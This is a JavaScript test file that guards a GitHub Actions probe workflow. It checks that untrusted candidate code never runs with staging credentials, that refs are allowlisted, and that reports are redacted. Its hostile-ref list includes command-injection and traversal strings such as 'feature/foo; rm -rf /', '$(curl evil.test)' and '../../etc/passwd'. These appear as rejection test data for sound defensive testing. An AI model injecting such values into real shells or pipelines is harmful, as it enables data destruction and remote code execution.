/**
 * E4.1 live-probe TRUST BOUNDARY.
 *
 * WHY THIS EXISTS: the first version of the probe workflow checked out the
 * caller-supplied `candidate_ref` and then executed THAT checkout's probe
 * source — and THAT checkout's harness tests — in steps holding staging
 * credentials. Two separate failures in one design:
 *
 *   1. anyone able to dispatch the workflow could run arbitrary code with
 *      staging secrets;
 *   2. a candidate could rewrite the assertions deciding whether it passed,
 *      i.e. certify itself.
 *
 * Neither is visible in a green run, which is exactly why it needs a test. The
 * invariant asserted here is simple and absolute:
 *
 *   UNTRUSTED / CANDIDATE-CONTROLLED SOURCE MUST NEVER EXECUTE WITH STAGING
 *   CREDENTIALS.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ROOT = path.resolve(__dirname, '..', '..');
const WORKFLOW = path.join(ROOT, '.github', 'workflows', 'e41-room-intelligence-live-probe.yml');
const PROBE = path.join(ROOT, 'security', 'release', 'run-e41-room-intelligence-live-probe.js');

const workflow = fs.readFileSync(WORKFLOW, 'utf8');

/** Workflow steps, split so a property can be asserted per step. */
function steps() {
  return workflow
    .split(/\n      - /)
    .slice(1)
    .map((block) => `      - ${block}`);
}

const CREDENTIAL_SECRETS = [
  'SUPABASE_STAGING_PUBLISHABLE_KEY',
  'STAGING_SYNTHETIC_ACTIVE_EMAIL',
  'STAGING_SYNTHETIC_ACTIVE_PASSWORD',
];

function credentialedSteps() {
  return steps().filter((s) => CREDENTIAL_SECRETS.some((secret) => s.includes(secret)));
}

// ── The candidate is never checked out ──────────────────────────────────────

test('the trusted checkout pins the default branch, never an input', () => {
  assert.match(
    workflow,
    /ref: master\n\s+path: trusted/,
    'the executable checkout must be a hardcoded trusted ref',
  );
});

test('candidate_ref is never used as a checkout ref', () => {
  // The original defect, stated directly.
  assert.ok(
    !/ref:\s*\$\{\{\s*inputs\.candidate_ref\s*\}\}/.test(workflow),
    'candidate_ref must never be checked out',
  );
});

test('no checkout step resolves a ref from workflow inputs at all', () => {
  for (const step of steps()) {
    if (!step.includes('actions/checkout')) continue;
    assert.ok(
      !/ref:\s*\$\{\{\s*inputs\./.test(step),
      `a checkout step takes its ref from an input:\n${step.slice(0, 200)}`,
    );
  }
});

// ── Credentialed steps execute trusted source only ──────────────────────────

test('every credentialed step runs from the trusted checkout', () => {
  const credentialed = credentialedSteps();
  assert.ok(credentialed.length > 0, 'expected at least one credentialed step');
  for (const step of credentialed) {
    assert.match(
      step,
      /working-directory: trusted/,
      `a credentialed step does not run from the trusted checkout:\n${step.slice(0, 200)}`,
    );
  }
});

test('no credentialed step executes a path derived from an input', () => {
  for (const step of credentialedSteps()) {
    assert.ok(
      !/node\s+[^\n]*\$\{\{\s*inputs\./.test(step),
      `an input reaches an executed path:\n${step.slice(0, 200)}`,
    );
  }
});

test('the credentialed step invokes the trusted CLI by literal path', () => {
  assert.match(workflow, /node security\/release\/e41-probe-cli\.js/);
  assert.ok(!/node -e/.test(workflow), 'no inline program may run with credentials');
});

test('the harness tests that decide PASS come from the trusted checkout', () => {
  // Otherwise a candidate rewrites its own PASS criteria and certifies itself.
  const verifyStep = steps().find((s) => s.includes('e41ProbeHarness.test.js'));
  assert.ok(verifyStep, 'the harness verification step is missing');
  assert.match(verifyStep, /working-directory: trusted/);
});

// ── Candidate ref handling is safe ──────────────────────────────────────────

test('the candidate ref is validated against a strict allowlist', () => {
  assert.match(workflow, /grep -Eq '\^\[A-Za-z0-9\._\/-\]\{1,255\}\$'/);
  assert.match(workflow, /\*\.\.\*/, 'traversal sequences must be refused');
});

test('the candidate ref reaches the shell through the environment, quoted', () => {
  // A ref interpolated directly into a run: block would be injected by the
  // Actions expression engine before bash ever quoted it.
  assert.match(workflow, /CANDIDATE_REF: \$\{\{ inputs\.candidate_ref \}\}/);
  const resolveStep = steps().find((s) => s.includes('Resolve candidate provenance'));
  assert.ok(resolveStep, 'provenance step missing');
  assert.ok(
    !/\$\{\{\s*inputs\.candidate_ref\s*\}\}/.test(resolveStep.split('run: |')[1] || ''),
    'candidate_ref must not be expanded inside the run body',
  );
  assert.match(resolveStep, /"\$\{CANDIDATE_REF\}"/, 'the ref must be quoted at every use');
});

test('an unresolvable candidate ref fails closed', () => {
  assert.match(workflow, /could not be resolved/);
  assert.match(workflow, /exit 1/);
});

test('hostile candidate ref shapes are rejected by the allowlist', () => {
  // Statically evaluate the same regex the workflow applies.
  const allow = /^[A-Za-z0-9._/-]{1,255}$/;
  const refused = (value) =>
    !allow.test(value) || value.includes('..') || value.startsWith('/') || value.endsWith('/');

  for (
    const hostile of [
      'feature/foo; rm -rf /',
      '$(curl evil.test)',
      '`whoami`',
      'feature/foo && echo pwned',
      'ref with spaces',
      '../../etc/passwd',
      'refs/heads/../../../x',
      '/absolute',
      'trailing/',
      'a|b',
      'a>b',
      "a'b",
    ]
  ) {
    assert.ok(refused(hostile), `hostile ref was not refused: ${hostile}`);
  }

  for (const legitimate of ['master', 'feature/foo', 'refs/heads/feature/foo', 'a'.repeat(40)]) {
    assert.ok(!refused(legitimate), `legitimate ref was refused: ${legitimate}`);
  }
});

// ── Environment authority ───────────────────────────────────────────────────

test('production is explicitly denied and missing identity fails closed', () => {
  assert.match(workflow, /EXPECTED_STAGING_REF: yzqjvdfgefveprobvvyw/);
  assert.match(workflow, /Refusing to target production/);
  assert.match(workflow, /Missing staging project identity/);
});

test('the production ref appears only as the guard constant', () => {
  const offending = workflow
    .split('\n')
    .filter((line) => line.includes('wyyuqfdxucjksghsmhry'))
    .filter((line) => !/^\s*PRODUCTION_REF:/.test(line));
  assert.deepEqual(offending, []);
});

test('permissions stay minimal and staging stays serialized', () => {
  assert.match(workflow, /permissions:\n\s+contents: read/);
  assert.match(workflow, /group: kscan-staging-deployment/);
});

// ── Provenance ──────────────────────────────────────────────────────────────

test('the report records candidate provenance without executing the candidate', () => {
  const probe = fs.readFileSync(PROBE, 'utf8');
  for (
    const field of [
      'candidateRefRequested',
      'candidateShaResolved',
      'candidateTreeSha',
      'probeTrustSourceSha',
      'probeWorkflowSha',
    ]
  ) {
    assert.ok(probe.includes(field), `provenance field missing: ${field}`);
  }
  assert.match(probe, /candidateSourceExecuted: false/);
});

test('the candidate SHA is resolved independently, not taken from the caller', () => {
  assert.match(workflow, /gh api "repos\/\$\{REPO\}\/commits\/\$\{CANDIDATE_REF\}" --jq '\.sha'/);
});

// ── Evidence privacy under hostile failure paths ────────────────────────────

test('secret-like strings injected into a failure path cannot reach the artifact', () => {
  // The redaction that matters is the one on the ERROR path: a happy-path
  // report is easy to keep clean, while a failure carries whatever the server
  // said back.
  const probe = require('../../security/release/run-e41-room-intelligence-live-probe.js');
  // Built at run time rather than committed: a token-shaped literal is a
  // legitimate Gitleaks `jwt` finding, and the scanner cannot know a literal is
  // fake. The constructed value has the identical shape the detector must
  // reject, so the behaviour under test is unchanged.
  const b64url = (value) => Buffer.from(JSON.stringify(value)).toString('base64url');
  const jwt = [
    b64url({ alg: 'HS256', typ: 'JWT' }),
    b64url({ sub: 'attacker', iat: 0 }),
    Buffer.from('synthetic-signature-not-a-real-key').toString('base64url'),
  ].join('.');

  for (
    const poisoned of [
      { groups: { owned_room: [{ scenario: 'x', pass: false, reasonCode: jwt }] } },
      { groups: { owned_room: [{ scenario: 'x', rejectionSnippet: 'user@example.com' }] } },
      { provenance: { candidateRefRequested: 'data:image/png;base64,AAAA' } },
      { summary: { failedScenarios: [{ reasonCode: 'sbp_' + 'a'.repeat(40) }] } },
      { latency: { note: 'https://staging.test/object?token=abc' } },
    ]
  ) {
    assert.throws(
      () => probe.assertEvidencePrivacy(poisoned),
      /evidence privacy assertion rejected/,
      `secret-like value survived: ${JSON.stringify(poisoned)}`,
    );
  }
});

test('a legitimate failure report still passes the privacy assertion', () => {
  // Redaction must not be so broad that real failures cannot be reported.
  const probe = require('../../security/release/run-e41-room-intelligence-live-probe.js');
  assert.doesNotThrow(() => probe.assertEvidencePrivacy({
    summary: { verdict: 'FAIL', failedScenarios: [{ scenario: 'anchor', reasonCode: 'ANCHOR_NOT_A_ROOM_ITEM' }] },
    provenance: { candidateShaResolved: 'a'.repeat(40), candidateSourceExecuted: false },
    latency: { sampleCount: 8, p50: 5374, p95: null },
  }));
});

test('the probe never writes raw model text into the report', () => {
  const source = fs.readFileSync(PROBE, 'utf8');
  // `text` is held in memory for assertions; it must not be placed on any
  // emitted structure.
  assert.ok(
    !/report[^\n]*\btext\b\s*:/.test(source),
    'raw model text must never be attached to the report',
  );
  assert.match(source, /assertEvidencePrivacy\(report\)/);
  // The rejection snippet is captured for failures only.
  assert.match(source, /res\.ok\s*\n?\s*\?\s*null/);
});
